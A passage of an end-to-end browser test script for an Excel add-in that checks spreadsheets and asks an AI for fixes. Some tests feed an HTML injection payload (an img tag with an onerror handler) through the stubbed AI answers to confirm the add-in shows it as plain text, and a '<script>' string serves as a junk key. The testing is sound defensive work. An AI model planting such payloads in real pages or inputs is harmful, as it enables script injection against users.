  const counted = await page.waitForFunction(() => document.getElementById("busy-secs").textContent === " 1 s", null, { timeout: 3000 }).then(() => true, () => false);
  await idle();
  ok(asking.shown && asking.said === "Asking the AI about your words…" && counted && !(await page.isVisible("#busy")),
    "AH-157: Check words says it is asking the AI, counts its seconds, and the line goes when the answer is in - " + JSON.stringify({ ...asking, counted }));
  posts.length = 0;
  await page.click("#odd-check"); await idle();
  ok(posts.join() === "/odd-text", "Check words with AI sends only /odd-text - " + posts);
  const odd = await page.$$eval("#odd-list li", (lis) => lis.map((li) => li.textContent));
  // AH-170: one line for the odd word, never one a cell: its 100 cells gave 100 identical lines
  ok(odd.length === 1 && /^Column B \(Region\): "Central" in 100 rows \(\d+, \d+, \d+ and 97 more\)\. The AI says: <img src=x onerror=/.test(odd[0]),
    `AH-170: the odd word in one line, with its column, how many rows and the first 3 (${odd.length} lines) - ${odd[0]}`);
  ok(!(await page.$("#odd-list img")) && !(await page.evaluate(() => window.__pwned)) && !odd.some((t) => t.includes("Atlantis")),
    "the AI's words are text, never markup; a word the AI made up is dropped");
  const sent = fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").map(JSON.parse).find((l) => l.prompt.includes("distinct values"));
  ok(sent && sent.prompt.includes('"Region"') && !/7777|170\.43|Units|2026-/.test(sent.prompt), "Check words sends the text column's words only, no numbers, dates or rows");
  for (const [how, fail, words] of [
    ["the provider fails", (r) => r.fulfill({ status: 502, contentType: "application/json", body: JSON.stringify({ error: AI_BROKE }) }), AI_BROKE],
    ["the engine goes down mid-call", dropMidway, DOWN]]) {
    await failing(DROPPED, async () => { await page.route("**/odd-text", fail, { times: 1 }); await page.click("#odd-check"); await idle(); });
    ok((await text("#odd-list")) === "AI could not check: " + words && !(await page.isDisabled("#odd-check")), `Check words when ${how}: said in plain words - ` + (await text("#odd-list")));
    const look = await looksLikeNotice("#odd-list li");
    ok(look.ok, `AH-149 review r2: Check words when ${how}: why it could not check is a notice at body size, said once - ` + JSON.stringify(look));
  }
  // AH-149 review: "AI could not check" was set at 15 px among 12 px hints and read as a heading; and the empty
  // progress-and-notice line held a band of space over the summary once Check words had cleared "Done"
  { const m = await page.evaluate(() => ({ odd: getComputedStyle(document.querySelector("#odd-list li")).fontSize, body: getComputedStyle(document.body).fontSize,
      status: document.getElementById("status").getBoundingClientRect().height, notice: document.getElementById("notice").textContent }));
    ok(m.odd === m.body, `Check words' answer, or why it could not check, is at body size - ${m.odd} (body ${m.body})`);
    ok(m.notice === "" && m.status < 1, `with nothing to say and nothing running, the progress and notice line holds no space over the summary - ${m.status} px`); }
  // AH-202: Check subject rules with AI sends only /rules; the AI reads the headers and kinds, never a cell; its rule is
  // checked on every row and the rows against it named by row, column letter and header; its words are text, never
  // markup; a rule naming a header that was not sent is dropped. The stub answers Total = Units x UnitCost with markup in
  // "why", and an order of a "Ship date" the sheet has not
  posts.length = 0;
  await page.click("#rules-check"); await idle();
  ok(posts.join() === "/rules", "AH-202: Check subject rules with AI sends only /rules - " + posts);
  { const lines = await page.$$eval("#rules-list li", (lis) => lis.map((li) => li.textContent));
    const rule = lines.find((l) => /^True on (all \d+|\d+ of \d+) rows: Total = Units × UnitCost\. The AI says: <img src=x onerror=/.test(l));
    ok(rule && (rule.startsWith("True on all") || lines.some((l) => /^Row \d+, column E \(Total\): Total \S+ is not Units × UnitCost \(\S+\): a rule the AI read from your headers, true on \d+ of \d+ rows\.$/.test(l)))
      && !lines.some((l) => l.includes("Ship date")), "AH-202: the rule, its AI words as text and the rows against it, a rule of a header not sent dropped - " + JSON.stringify(lines.slice(0, 3)));
    ok(!(await page.$("#rules-list img")) && !(await page.evaluate(() => window.__pwned)), "AH-202: the AI's words are text, never markup");
    const asked = fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").map(JSON.parse).find((l) => l.prompt.includes("column headers of a spreadsheet"));
    ok(asked && asked.prompt.includes('["Units", "number"]') && !/7777|170\.43|"East"|2026-/.test(asked.prompt), "AH-202: Check subject rules sends the headers and their kinds only, never a cell"); }
  for (const [how, fail, words] of [
    ["the provider fails", (r) => r.fulfill({ status: 502, contentType: "application/json", body: JSON.stringify({ error: AI_BROKE }) }), AI_BROKE],
    ["the engine goes down mid-call", dropMidway, DOWN]]) {
    await failing(DROPPED, async () => { await page.route("**/rules", fail, { times: 1 }); await page.click("#rules-check"); await idle(); });
    ok((await text("#rules-list")) === "AI could not check: " + words && !(await page.isDisabled("#rules-check")), `AH-202: Check subject rules when ${how}: said in plain words - ` + (await text("#rules-list")));
    ok((await looksLikeNotice("#rules-list li")).ok, `AH-202: Check subject rules when ${how}: a notice at body size, said once`);
  }
  await page.click("#rules-check"); await idle();
  // AH-170: Check words' lines name cells of the sheet they were asked about: another sheet's check never shows them
  await page.click("#odd-check"); await idle();
  const oddBefore = await page.$$eval("#odd-list li", (lis) => lis.length);
  await page.evaluate(() => __load("Other", [["Item", "Qty"], ...Array.from({ length: 30 }, (_, k) => [["Pen", "Ink"][k % 2], k + 1])]));
  await find();
  ok(oddBefore > 0 && (await page.$$eval("#odd-list li", (lis) => lis.length)) === 0 && (await text("#sheet-name")) === "Other",
    `AH-170: Find problems on another sheet clears the old Check words lines (${oddBefore} before)`);
  ok((await page.$$eval("#rules-list li", (lis) => lis.length)) === 0, "AH-202: Find problems on another sheet clears the old Check subject rules lines");
}

if (mode === "nokey") { // engine started with no key: John's free AI through the relay, here stub_ai.py's /fix (e2e/engine.py)
  await find();
  await openRow(11);
  // AH-151: a fresh pane with no key has the free AI on, says so in AI help, and Ask AI works with nothing secret sent
  // AH-228 P-10 (was "AI help is on, using a free shared AI with a few requests a day for each internet connection. For
  // more, paste your own free Google key below."): one line, the steps for a key of one's own folded, closed
  const FREE = "AI help works now, free, with a daily limit. For more answers, use your own free Google key.";
  const free = JSON.parse(await page.evaluate(() => fetch("/health").then((r) => r.text())));
  ok(free.ai_available && free.ai_provider === "free" && (await page.isVisible("#ai-fold")) && !(await page.isVisible("#ai-off"))
    && (await text("#ai-state")) === FREE && !(await page.isDisabled("#fix-ask")),
    "without a key: the free AI is on, said in AI help, and Ask AI is there - " + JSON.stringify(free) + " " + (await text("#ai-state")));
  await page.click("#ai-fold > summary"); // AH-175: Ask AI is folded under the card's fix
  await page.click("#fix-ask");
  await page.waitForFunction(() => document.getElementById("fix-label").textContent === "AI's fix", null, { timeout: 30000 });
  const relayed = fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").map(JSON.parse).at(-1);
  ok(relayed.path === "/fix" && relayed.auth === false && (await text("#fix-changes")).startsWith("C11: -5 → =AVERAGEIFS("),
    "Ask AI with no key: the free AI's fix, through the relay's /fix with no Authorization header - " + JSON.stringify({ path: relayed.path, auth: relayed.auth }));
  await page.click("#settings summary");
  { const m = await page.evaluate(() => ({ open: document.getElementById("own-key").open, key: document.getElementById("ai-key").checkVisibility(),
      summary: document.querySelector("#own-key > summary").textContent, words: document.getElementById("settings").innerText.replace(document.getElementById("own-key").innerText, "").split(/\s+/).length }));
    ok(!m.open && !m.key && m.summary === "Use your own Google key" && m.words < 110, "AH-228 P-10: AI help says it works with no key; the steps and the key box wait, closed, under Use your own Google key - " + JSON.stringify(m)); }
  await page.click("#own-key summary");
  // AH-157: Save key says at once that the key is being tested (the line kept "AI help is on" for up to 15 s)
  await page.route("**/key", async (r) => { await new Promise((go) => setTimeout(go, 800)); await r.continue(); }, { times: 1 });
  await page.fill("#ai-key", "<script>"); await page.click("#save-key");
  const testing = await text("#ai-state");
  ok(testing === "Testing the key with Google…", "AH-157: Save key says at once that it is testing the key - " + testing);
  await page.waitForFunction(() => document.getElementById("ai-state").textContent.includes("doesn't look like an API key"));
  ok((await page.inputValue("#ai-key")) === "", "junk key refused, and cleared from the box: a refused key is no use to retry (AH-15)");
  // Save with an empty box (the paste didn't land) must say so - never "Saved", never a silent remove (John, 2026-10-12)
  const keyCalls = [];
  page.on("request", (r) => r.url().endsWith("/key") && keyCalls.push(r));
  await page.fill("#ai-key", ""); await page.click("#save-key");
  await page.waitForFunction(() => document.getElementById("ai-state").textContent.includes("Paste a key"));
  ok(keyCalls.length === 0, "empty Save asks for a key and sends nothing - " + (await text("#ai-state")));
  // an invite code turns AI help on (nothing is sent anywhere: the relay checks it at the first Ask AI), never stays on
  // screen or comes back from the engine; Remove key turns it off and deletes it from this PC
  const code = "inv_e2eNotARealInviteCode123";
  // a double click saves once: each Save sent its own /key, and a Google key is tried with Google for up to 15 s each (AH-87)
  const k0 = keyCalls.length;
  await page.fill("#ai-key", code); await page.dblclick("#save-key");
  await page.waitForFunction(() => document.getElementById("ai-state").textContent.startsWith("Invite code saved"));
  await page.waitForTimeout(500); // room for a second /key to show up
  ok(keyCalls.length - k0 === 1, `a double click on Save key sends one /key - ${keyCalls.length - k0}`);
  const health = await page.evaluate(() => fetch("/health").then((r) => r.text()));
  ok((await page.isVisible("#ai-fold")) && !(await page.isVisible("#ai-off")) && JSON.parse(health).ai_provider === "relay",
    "invite code saved: AI help is on, through the relay - " + (await text("#ai-state")));
  ok((await page.inputValue("#ai-key")) === "" && !(await page.content()).includes(code) && !health.includes(code)
    && fs.readFileSync(DIR + "cert/invite-code.txt", "utf8") === code, "the code is kept on this PC only: never on screen, never in an answer");
  const c5 = calls.length;
  await page.dblclick("#remove-key");
  await page.waitForFunction(() => document.getElementById("ai-state").textContent === "Key removed. AI help uses the free shared AI again.");
  await page.waitForTimeout(500);
  ok(since(c5) === "/key" && calls[c5][1].key === "", "Remove key, double-clicked, sends exactly one /key, with an empty key - " + since(c5));
  ok((await page.isVisible("#ai-fold")) && !(await page.isVisible("#ai-off")) && !fs.existsSync(DIR + "cert/invite-code.txt"),
    "Remove key: back to the free AI, the code deleted from this PC");
  // saving fails: the PC can't keep the file (the engine's 503, AH-13), or the engine is gone. Said where the key goes,
  // and the key stays in its box to try again (cleared after a save, or when the engine refuses the key itself)
  const disk = `Couldn't save that on this PC. The disk may be full or the file in use: close other programs and try again. The details are in ${LOG_AT}.`;
  for (const [how, fail, words] of [
    ["the PC can't keep it", (r) => r.fulfill({ status: 503, contentType: "application/json", body: JSON.stringify({ error: disk }) }), disk],
    ["the engine goes down mid-save", dropMidway, DOWN]]) {
    await failing(DROPPED, async () => {
      await page.route("**/key", fail, { times: 1 }); await page.fill("#ai-key", code); await page.click("#save-key");
      await page.waitForFunction((w) => document.getElementById("ai-state").textContent === w, words, { timeout: 10000 }).catch(() => {});
    });
    ok((await text("#ai-state")) === words && (await page.isVisible("#ai-fold")) && (await page.inputValue("#ai-key")) === code,
      `Save key when ${how}: said in plain words, AI help stays on the free AI, the key kept in its box to try again - ` + (await text("#ai-state")));
    const look = await looksLikeNotice("#ai-state");
    ok(look.ok, `AH-149 review r2: Save key when ${how}: why it was not saved is a notice at body size, said once - ` + JSON.stringify(look));
  }
  await page.fill("#ai-key", "");
}

if (mode === "flow2") {
  // AH-94: under reduced motion the same states come without movement: no entrance, the skeleton without its light, a
  // hovered row filled but not lifted, the card shown without a turn, the list back without a fade
  {
    const calm = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 }, reducedMotion: "reduce" });
    const heard = [];
    calm.on("pageerror", (e) => heard.push(e.message));
    // AH-183: on Windows CI (PR #120, run 43966622884) #main-ui stayed hidden for the whole wait and the run said
    // nothing else. Every /health and every other failed request is kept, so the next timeout says why: a module that
    // fails to load leaves the pane on its first screen with no page error (AH-43, trust.mjs)
    const t0 = Date.now(), health = [], failed = [], where = (u) => new URL(u).pathname;
    calm.on("request", (q) => { if (where(q.url()) === "/health") health.push({ q, at: Date.now() - t0, outcome: "pending" }); });
    calm.on("response", (s) => { const h = health.find((h) => h.q === s.request()); if (h) h.outcome = `${s.status()} in ${Date.now() - t0 - h.at} ms`; });
    calm.on("requestfailed", (q) => { const h = health.find((h) => h.q === q), why = q.failure()?.errorText;
      if (h) h.outcome = `failed: ${why}`; else failed.push(`${where(q.url())}: ${why}`); });
    await calm.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
    await calm.goto("https://127.0.0.1:5055/taskpane.html");
    await calm.evaluate((rows) => __load("Sales", rows, [0]), rows);
    await calm.waitForSelector("#main-ui", { state: "visible" }).catch(async (e) => {
      // #skeleton sits in #app-body, hidden until Office.onReady: app-body hidden beside sideload-msg = app.js never ran
      const shown = await calm.evaluate(() => ({ office: typeof Office, ...Object.fromEntries(["sideload-msg", "app-body", "skeleton", "server-down", "main-ui"]
        .map((id) => [id, document.getElementById(id)?.checkVisibility() ?? null])) })).catch(() => null);
      console.error("calm page after the wait:", JSON.stringify({ shown, heard, health: health.map(({ at, outcome }) => ({ at, outcome })), failed, ms: Date.now() - t0 }));
      if (process.env.SHOTS) await calm.screenshot({ path: `${process.env.SHOTS}/pane-calm-timeout.png` }).catch(() => {});
      throw e;
    });
    const still = () => calm.evaluate(() => document.getAnimations().filter((a) => a.timeline === document.timeline && (a.transitionProperty ? [a.transitionProperty]
      : a.effect.getKeyframes().flatMap(Object.keys)).some((p) => /transform|opacity|translate|scale|rotate/.test(p))).length);
    const seen = [];
    seen.push(["opened", await still(), await calm.evaluate(() => [...document.querySelectorAll("[data-enter]")].filter((e) => e.style.transform).length)]);
    await calm.click("#scan");
    seen.push(["scanning", await still(), await calm.evaluate(() => document.getElementById("scan-skeleton")?.offsetParent != null), await calm.evaluate(() => { const s = document.getElementById("scan-skeleton"); return s && getComputedStyle(s, "::after").animationName; })]);
    await calm.waitForFunction(() => !document.getElementById("scan").disabled);
    await calm.hover("#flagged-list button");
    seen.push(["hovered", await still(), await calm.evaluate(() => getComputedStyle(document.querySelector("#flagged-list button")).transform)]);
    await calm.click('#flagged-list button:has-text("Row 11 ")');
    seen.push(["card", await still(), await calm.evaluate(() => document.getElementById("fix-view").getAnimations({ subtree: true }).length)]);
    await calm.waitForFunction(() => !document.getElementById("scan").disabled);
    await calm.click("#fix-back");
    seen.push(["back", await still()]);
    ok(heard.length === 0 && JSON.stringify(seen) === '[["opened",0,0],["scanning",0,true,"none"],["hovered",0,"none"],["card",0,0],["back",0]]',
      "reduced motion: the skeleton, the fill and the card come without any movement - " + JSON.stringify({ seen, heard }));
    // AH-184: a decision under reduced motion: the finish line at its width at once, the row Fixed with nothing fading
    await calm.click('#flagged-list button:has-text("Row 11 ")'); await calm.waitForFunction(() => !__state.working && document.getElementById("fix-apply").checkVisibility());
    await calm.click("#fix-apply"); await calm.waitForFunction(() => !__state.working && document.getElementById("fix-undo").checkVisibility());
    const decided = { moving: await still(), line: await calm.evaluate(() => getComputedStyle(document.getElementById("status"), "::before").transform) };
    await calm.click("#fix-back"); await calm.waitForSelector("#results", { state: "visible" });
    Object.assign(decided, { back: await still(), was: await calm.$$eval("#flagged-list .was", (w) => w.length), fixed: await calm.textContent("#flagged-list") });
    ok(decided.moving === 0 && /^matrix\(0\.2, /.test(decided.line) && decided.back === 0 && decided.was === 0 && decided.fixed.includes("Fixed"),
      "AH-184: under reduced motion the finish line is drawn at its width and the row turns Fixed with no fade - " + JSON.stringify(decided));
    await calm.close();
  }

  // the pane opened while the user is typing in a cell: real Excel rejects Excel.run (InvalidOperationInCellEditMode),
  // and the start-up sheet-name read left that rejection unhandled. A page of its own: its first Excel.run fails (AH-58)
  const busy = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
  const heard = [];
  busy.on("pageerror", (e) => heard.push(`pageerror: ${e.message}`));
  await busy.exposeFunction("__unhandled", (kind, what) => heard.push(`${kind}: ${what}`));
  await busy.addInitScript(() => {
    window.__cellEdit = 1;
    addEventListener("unhandledrejection", (e) => __unhandled("unhandledrejection", String(e.reason?.stack || e.reason)));
    addEventListener("error", (e) => __unhandled("error", String(e.error?.stack || e.message)));
  });
  await busy.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
  await busy.goto("https://127.0.0.1:5055/taskpane.html");
  const ready = await busy.waitForSelector("#main-ui", { state: "visible", timeout: 10000 }).then(() => true, () => false);
  await busy.waitForTimeout(300);
  const st = await busy.evaluate(() => ({ failed: window.__cellEdit === 0, name: document.getElementById("sheet-name").textContent,
    empty: document.getElementById("empty-state").offsetParent !== null }));
  ok(ready && st.failed && st.empty && st.name === "" && heard.length === 0,
    "opened mid cell-edit: the sheet-name read fails quietly, the pane still gets ready - " + JSON.stringify({ ready, ...st, heard }));
  await busy.close();

  // AH-204: the list draws at most CAP (50) rows and one "+ N more" line however many a scan flags (a 150,000-row sheet
  // flagging 6,134 drew 51 items, 301 nodes). The real renderResults, on a page of its own, at the cap's limits both ways
  const many = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
  const slips = [];
  many.on("pageerror", (e) => slips.push(e.message));
  await many.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
  await many.goto("https://127.0.0.1:5055/taskpane.html");
  await many.waitForSelector("#main-ui", { state: "visible" });
  for (const [count, more] of [[6000, "+ 5,950 more"], [51, "+ 1 more"], [50, null]]) {
    const got = await many.evaluate(async (count) => {
      const { renderResults } = await import("./pages/results.js");
      const row = { bucket: "Irregularities", cells: ["Total"], exact: {}, formula: {}, likely: {}, maybe: {}, magnitude: 0, reason: "Total 10 does not add up: Qty × Price = 1", severity: "Medium" };
      const rows = Array.from({ length: count }, () => ({ ...row }));
      Object.assign(__state, { lastRows: rows, lastScan: { startRow: 0 }, decided: {} });
      renderResults(rows, {}, null);
      const list = document.getElementById("flagged-list");
      const out = { rows: list.querySelectorAll("li[data-i] button").length, next: list.querySelector(".more-rows button")?.textContent, more: [...list.querySelectorAll(".more-rows")].map((li) => li.textContent), nodes: list.querySelectorAll("*").length };
      // AH-228 P-20: the rows past the first 50 are a press away, 20 at a time, never past 250
      const press = () => list.querySelector(".more-rows button")?.click();
      press(); out.after = list.querySelectorAll("li[data-i] button").length;
      for (let k = 0; k < 20; k++) press();
      out.most = list.querySelectorAll("li[data-i] button").length;
      out.last = list.querySelector(".more-rows")?.textContent ?? null;
      return out;
    }, count);
    ok(got.rows === 50 && got.nodes < 400 && slips.length === 0 && (more ? got.more.length === 1 && got.more[0].startsWith(more + ", all highlighted in the sheet.") : !got.more.length),
      `AH-204: ${count} flagged rows draw 50 rows${more ? ` and "${more}"` : " and no more line"} - ` + JSON.stringify({ ...got, slips }));
    const want = { 6000: [70, 250, "Show the next 20"], 51: [51, 51, "Show the next 1"], 50: [50, 50, undefined] }[count];
    ok(got.after === want[0] && got.most === want[1] && got.next === want[2] && (count === 6000 ? got.last.endsWith("Fix these first, then click Find problems again.") : got.last === null),
      `AH-228 P-20: "Show the next 20" draws 20 more rows, never past 250 - ` + JSON.stringify({ count, after: got.after, most: got.most, next: got.next, last: got.last }));
  }
  await many.close();

  // AH-212: a power user's sheet of two tables: a header of two rows (Jan, Feb, Mar under a merged Costs), a Region merged
  // down each group, subtotal rows, then a second table stacked below two blank rows, and a label with its number under
  // it. Each table is its own /scan, merged labels filled and subtotals blank for the engine only; a planted cell in each
  // table is listed, coloured and opened at its own sheet row; Accept writes the right cell; the note names what was not read
  {
    const lay = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
    const slipped = [], sent = [];
    lay.on("pageerror", (e) => slipped.push(e.message));
    lay.on("request", (r) => r.url().endsWith("/scan") && sent.push(JSON.parse(r.postData())));
    await lay.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
    await lay.goto("https://127.0.0.1:5055/taskpane.html");
    await lay.waitForSelector("#main-ui", { state: "visible" });
    const sheet = [["Shop costs", "", "", "", "", ""], ["", "", "", "", "", ""], ["Item", "Region", "Costs", "", "", "Total"], ["", "", "Jan", "Feb", "Mar", ""]];
    const sums = [];
    for (const region of ["North", "South"]) {
      for (let i = 0; i < 12; i++) { const a = 100 + 7 * i, b = 200 + 3 * i, c = 150 + 5 * i; sheet.push([`${region[0]}-${i + 1}`, i ? "" : region, a, b, c, a + b + c]); }
      sums.push(sheet.length + 1);
      sheet.push(["", `Subtotal ${region}`, 0, 0, 0, 0]);
    }
    sheet[7][5] += 900; // F8: a total that does not add up, under the two-row header
    sheet.push(["", "", "", "", "", ""], ["", "", "", "", "", ""], ["Leave requests", "", "", "", "", ""], ["Request", "Employee", "Days", "Approved", "", ""]);
    for (let i = 0; i < 30; i++) sheet.push([`R-${i + 1}`, `E-${100 + i}`, 1 + (i % 5), i % 3 ? "Yes" : "No", "", ""]);
    sheet[49][2] = "two"; // C50: text in the second table's number column
    sheet[54][3] = "yes"; // D55: a capitals slip, a fix the card can write
    sheet[59][3] = "Maybe"; // D60: outside the column's drop-down list of Yes and No (AH-213)
    sheet.push(["", "", "", "", "", ""], ["Pass mark", 40, "", "", "", ""], ["", "", "", "", "", ""], ["#REF!", "", "", "", "", ""]); // A68: a formula's error, no table's (AH-218)
    await lay.evaluate(([rows, sums]) => {
      __load("Layout", rows);
      for (const r of sums) for (const c of "CDEF") __formula("Layout", `${c}${r}`, `=SUM(${c}${r - 12}:${c}${r - 1})`);
      __merge("Layout", ["A1:F1", "A3:A4", "B3:B4", "C3:E3", "F3:F4", "B5:B16", "B18:B29"]);
      __validate("Layout", "D35:D64", ["Yes", "No"]);
      __formula("Layout", "A68", "=SUM(#REF!)");
    }, [sheet, sums]);
    await lay.click("#scan");
    await lay.waitForFunction(() => !document.getElementById("scan").disabled && !__state.working);
    const got = await lay.evaluate(() => ({ list: [...document.querySelectorAll("#flagged-list button")].map((b) => b.innerText.split("\n")[0]),
      fills: ["F8", "C50", "F17", "B6", "A8", "D60", "C60"].map((a) => !!__cell("Layout", a).fill), notes: document.getElementById("book-notes").innerText,
      row60: [...document.querySelectorAll("#flagged-list button")].map((b) => b.innerText).find((t) => /^Row 60\b/.test(t)) || "" }));
    const [one, two] = sent;
    ok(sent.length === 2 && JSON.stringify(one.columns) === '["Item","Region","Costs Jan","Costs Feb","Costs Mar","Total"]' && one.start_row === 3
      && one.rows[1][1] === "North" && one.rows[12].every((v) => v === "") && one.formulas?.[12][2] === "=SUM(R[-12]C:R[-1]C)" && one.formulas[1].every((f) => f === null)
      && JSON.stringify(two.columns) === '["Request","Employee","Days","Approved"]'
      && two.start_row === 33 && two.rows.length === 30 && one.power_bi === false && two.power_bi === false,
      "AH-212: two stacked tables are two /scans: names from both header rows, the merged Region filled down, the subtotal blank (its formulas kept, AH-213), never in a cell - "
      + JSON.stringify({ n: sent.length, one: one && [one.columns, one.start_row, one.rows[1], one.rows[12], one.formulas?.[12]], two: two && [two.columns, two.start_row, two.rows.length] }));
    ok(!one.off_list && JSON.stringify(two.off_list) === "[[25,3]]" && got.row60.includes('Approved "Maybe" is not one of the choices its drop-down list allows'),
      "AH-213: the cell Excel says is outside its drop-down list goes with its own table's /scan, and is listed in the engine's words - " + JSON.stringify({ one: one.off_list, two: two.off_list, row60: got.row60 }));
    ok(got.list.some((t) => /^Row 8\b/.test(t)) && got.list.some((t) => /^Row 50\b/.test(t)) && got.list.some((t) => /^Row 55\b/.test(t))
      && JSON.stringify(got.fills) === "[true,true,false,false,false,true,false]",
      "AH-212: the planted cell in each table is listed and coloured at its own sheet row, the subtotal and the merged label never - " + JSON.stringify(got));
    ok(got.notes.includes("Cells A66:B66 on this sheet were not checked: they hold no table Arcas can read."),
      "AH-212: the cells no table holds are said under the results, in a notice - " + JSON.stringify(got.notes));
    ok(got.notes.includes("Cell A68 on this sheet shows #REF!, outside any table Arcas checks: it points at a cell or sheet that was deleted.") && !got.notes.includes("A68 on this sheet was")
      && !got.notes.includes("A66:B66 and"), "AH-218: an Excel error no table holds is named with what it means, once - " + JSON.stringify(got.notes));
    // a cell of the second table picked in the sheet opens its own row's card; Accept there writes its own cell, D55
    await lay.evaluate(() => __userSelect("Layout", "C50"));
    await lay.waitForFunction(() => /^Row 50:/.test(document.getElementById("fix-title").textContent) && !__state.working);
    await lay.click("#fix-back");
    await lay.click('#flagged-list button:has-text("Row 55 ")');
    await lay.waitForFunction(() => !__state.working && document.getElementById("fix-apply").checkVisibility());
    await lay.click("#fix-apply");
    await lay.waitForFunction(() => !__state.working && document.getElementById("fix-undo").checkVisibility());
    await lay.waitForFunction(() => /looks right now|still sees/.test(document.getElementById("fix-status").textContent));
    const after = await lay.evaluate(() => ({ d55: __cell("Layout", "D55").v, status: document.getElementById("fix-status").textContent,
      c50: __cell("Layout", "C50").v, f8: __cell("Layout", "F8").v }));
    ok(after.d55 === "Yes" && after.c50 === "two" && after.f8 === 1395 && after.status === "Accepted and checked again: row 55 looks right now." && slipped.length === 0,
      "AH-212: Accept in the second table writes its own cell, and the row is checked again in its own table - " + JSON.stringify({ ...after, slipped }));
    // AH-218: a write of several cells holds Excel's recalculation once, before its writes, never once a cell; a write of
    // one cell (that Accept) and an Excel without ExcelApi 1.6 never ask, and still write
    const held = await lay.evaluate(async () => {
      const { writeCells } = await import("./services/excel.js"), n = () => window.__suspended || 0, out = { accept: n() };
      __log.length = 0;
      await writeCells("Layout", [{ cell: "H1", value: "a" }, { cell: "H2", value: "b" }]);
      out.two = [n(), __log.map((e) => e[0]).join()];
      await writeCells("Layout", [{ cell: "H1", value: "" }, { cell: "H2", value: "" }, { cell: "H3", value: "" }]);
      out.three = n();
      window.__noApi = "1.6";
      await writeCells("Layout", [{ cell: "H1", value: "c" }, { cell: "H2", value: "d" }]);
      out.old = [n(), __cell("Layout", "H1").v, __cell("Layout", "H2").v];
      return out;
    });
    ok(held.accept === 0 && JSON.stringify(held.two) === '[1,"suspend,write,write"]' && held.three === 2 && JSON.stringify(held.old) === '[2,"c","d"]',
      "AH-218: a multi-cell write holds Excel's recalculation once, first; one cell or an older Excel never asks - " + JSON.stringify(held));
    await lay.close();
  }

  // AH-238: a row that adds up wrong where two cells could each be the slip (Qty 10 for 1, Total 7.99 = 1 x 7.99): the card
  // offers both answers as two buttons, the numbers cannot say which, so Arcas never picks. Each writes only its own cell,
  // Undo puts the row back and both buttons return. At 320 px the two buttons fit and clear AA. Made-up shop sheet
  {
    const two = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 320, height: 900 } });
    const slipped = [];
    two.on("pageerror", (e) => slipped.push(e.message));
    await two.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
    await two.goto("https://127.0.0.1:5055/taskpane.html");
    await two.waitForSelector("#main-ui", { state: "visible" });
    const prices = [3.49, 5.99, 7.99, 8.75, 12.5, 24, 6.25, 2.99], shop = [["Order", "Qty", "Unit Price", "Total"]];
    for (let i = 0; i < 80; i++) { const q = 1 + ((i * 5) % 12), p = prices[(i * 3) % 8]; shop.push([`SO-${1000 + i}`, q, p, +(q * p).toFixed(2)]); }
    shop[12] = ["SO-1012", 10, 7.99, 7.99]; // B13 should be 1 (or D13 79.9)
    await two.evaluate((rows) => __load("Shop", rows), shop);
    await two.click("#scan");
    await two.waitForFunction(() => !document.getElementById("scan").disabled && !__state.working);
    await two.click('#flagged-list button:has-text("Row 13 ")');
    await two.waitForFunction(() => !__state.working && document.getElementById("fix-title").textContent.startsWith("Row 13") && !document.getElementById("fix-view").hasAttribute("data-opening"));
    const card = () => two.evaluate(() => ({ picks: [0, 1].map((k) => { const b = document.getElementById(`fix-pick-${k}`); return b && b.checkVisibility() ? b.textContent : null; }),
      accept: document.getElementById("fix-apply").checkVisibility(), label: document.getElementById("fix-label").textContent, aiOpen: document.getElementById("ai-fold").open,
      aiSummary: document.getElementById("ai-fold").querySelector("summary").textContent, said: document.getElementById("fix-explanation").textContent,
      cells: [__cell("Shop", "B13").v, __cell("Shop", "D13").v] }));
    const c1 = await card();
    ok(JSON.stringify(c1.picks) === '["Make Qty 1","Make Total 79.9"]' && !c1.accept && !c1.aiOpen && c1.aiSummary === "Want a different fix? Ask AI"
      && c1.label === "Two possible fixes" && c1.said.includes("Qty should be 1 or Total should be 79.9") && !/[\u2013\u2014]/.test(c1.said) && JSON.stringify(c1.cells) === "[10,7.99]",
      "AH-238: a row where two cells could each be the slip shows both answers as buttons, no Accept, Ask AI folded, nothing written - " + JSON.stringify(c1));
    const tall = await two.$$eval("#fix-pick-0, #fix-pick-1", (bs) => bs.map((b) => [Math.round(b.getBoundingClientRect().height), b.scrollWidth > b.clientWidth, Math.round(b.getBoundingClientRect().right)]));
    ok(tall.every(([h, over, right]) => h >= 44 && !over && right <= 320) && (await two.evaluate(() => document.documentElement.scrollWidth <= 320)),
      "AH-238: at 320 px each button is a finger tall, its words fit, and nothing scrolls sideways - " + JSON.stringify(tall));
    await two.waitForFunction(() => document.getAnimations().every((a) => a.timeline !== document.timeline || a.playState !== "running"), null, { timeout: 5000 });
    const bad = await two.evaluate(contrastProblems);
    ok(bad.length === 0, "AH-238: the two-choice card clears WCAG AA at 320 px - " + JSON.stringify(bad));
    if (process.env.SHOTS) await two.screenshot({ path: `${process.env.SHOTS}/pane-two-choices-320.png` });
    await two.click("#fix-pick-1");
    await two.waitForFunction(() => !__state.working && document.getElementById("fix-undo").checkVisibility());
    const c2 = await card();
    ok(JSON.stringify(c2.cells) === "[10,79.9]" && JSON.stringify(c2.picks) === "[null,null]" && c2.label === "Accepted fix",
      "AH-238: Make Total 79.9 writes only the Total, and the card says it is fixed - " + JSON.stringify(c2));
    if (process.env.SHOTS) await two.screenshot({ path: `${process.env.SHOTS}/pane-two-choices-picked-320.png` });
    await two.click("#fix-undo");
